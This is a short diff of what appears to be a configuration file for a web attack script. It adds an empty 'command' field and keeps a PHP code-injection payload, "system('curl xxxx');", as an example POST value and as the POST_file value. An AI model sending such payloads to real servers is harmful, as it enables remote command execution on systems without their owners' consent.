@@ -6,7 +6,7 @@ flags = []
 cookies=''
 datas=''
 url=''
-
+command=''
 # Example:POST_data={'x':"system('curl xxxx');"}
 POST_file = "system('curl xxxx');"
 
